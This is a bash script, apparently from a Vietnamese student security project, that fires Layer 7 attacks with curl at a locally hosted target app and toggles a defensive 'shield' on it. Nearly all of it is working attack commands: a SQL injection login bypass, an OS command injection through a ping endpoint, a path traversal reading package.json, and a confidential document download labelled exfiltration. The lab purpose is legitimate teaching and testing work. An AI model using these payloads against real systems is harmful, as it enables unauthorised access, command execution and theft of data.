#!/usr/bin/env bash
# ============================================================================
# PBL4 - Layer 7 Application Attack & Firewall Bypass CLI Runner
# Phụ trách: Hoàng Trung (TV3) - Target App & Tấn công L7 (Task W4-T3)
# ============================================================================
set -euo pipefail

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
project_root="$(cd "$script_dir/.." && pwd)"

# Ưu tiên chạy qua Node.js nếu có sẵn
if command -v node >/dev/null 2>&1; then
  exec node "$script_dir/attack-l7.mjs" "$@"
fi

# Fallback sang curl nếu không có Node.js trên máy host
echo "[ATTACK-L7] Không tìm thấy Node.js trên máy, chuyển sang chế độ curl fallback..."

TARGET="${TARGET_APP_URL:-http://localhost:18000}"

case "${1:-all}" in
  sqli)
    echo "=== [1] SQL Injection Bypass Login ==="
    curl -s -X POST "$TARGET/api/auth/login" \
      -H "Content-Type: application/json" \
      -d '{"username":"admin'\'' --","password":"any"}' | jq . || cat
    ;;
  cmd)
    echo "=== [2] OS Command Injection ==="
    curl -s "$TARGET/api/system/network-ping?host=127.0.0.1%3B%20id" | jq . || cat
    ;;
  traversal)
    echo "=== [3] Path Traversal ==="
    curl -s "$TARGET/api/files/download?name=..%2F..%2Fpackage.json"
    ;;
  exfil)
    echo "=== [4] Confidential Document Exfiltration ==="
    curl -s "$TARGET/api/documents/5/download"
    ;;
  status)
    echo "=== Trạng thái Khiên L3 ==="
    curl -s "$TARGET/api/defense/status" | jq . || cat
    ;;
  toggle)
    echo "=== Đảo trạng thái Khiên L3 ==="
    curl -s -X POST "$TARGET/api/defense/toggle" -H "Content-Type: application/json" -d '{}' | jq . || cat
    ;;
  all|*)
    echo "=== Chạy toàn bộ kịch bản L7 qua curl ==="
    "$0" status
    "$0" sqli
    "$0" cmd
    "$0" traversal
    "$0" exfil
    ;;
esac
